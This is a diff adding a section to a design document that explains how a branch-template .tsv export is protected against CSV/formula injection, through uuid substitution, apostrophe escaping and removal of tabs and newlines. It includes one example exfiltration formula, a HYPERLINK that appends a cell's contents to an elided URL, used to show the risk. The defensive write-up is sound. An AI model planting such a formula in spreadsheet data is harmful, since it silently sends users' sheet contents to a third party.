@@ -146,6 +146,32 @@ apart.
 A branch listed twice in one paste is refused as well, naming the earlier line:
 otherwise whichever row came last would win, silently.
 
+### The template cannot carry a formula out of the database
+
+The downloaded `.tsv` is opened in Excel or Google Sheets, and both read a cell
+that begins `=`, `+`, `-` or `@` as a **formula** rather than as text. Branch
+names are administrator- and POS-supplied, so a branch named
+`=HYPERLINK("http://…"&A1,"open")` would run in the administrator's own
+spreadsheet the moment the file opened — sending the rest of the sheet to a third
+party, with no prompt a reader would recognise as a warning. That is the
+CSV-injection class, and it is closed at the point the file is written.
+
+The two columns are protected differently, because only one of them is read back:
+
+- **`branch`** carries the **id** whenever the name would be unsafe, exactly as
+  it already does for a name that is not unique. Escaping it instead would make
+  the row resolve to no branch at all, so the sheet would stop importing — the id
+  is a `uuid`, which by its own type can neither begin with a formula character
+  nor contain a tab.
+- **`note`** is decorative; no parser reads it. It is escaped in place: a leading
+  formula character gets the apostrophe both spreadsheets treat as "this cell is
+  text".
+
+Tabs, carriage returns and newlines are handled in the same pass, for a different
+reason: a tab inside a name would invent a column and a newline would invent a
+row, so one branch name could re-shape every row below it — and the invented row
+would be parsed on import as a real one.
+
 ### What it does not do
 
 - **Nothing is written on paste.** Pasting parses; a separate button applies. The
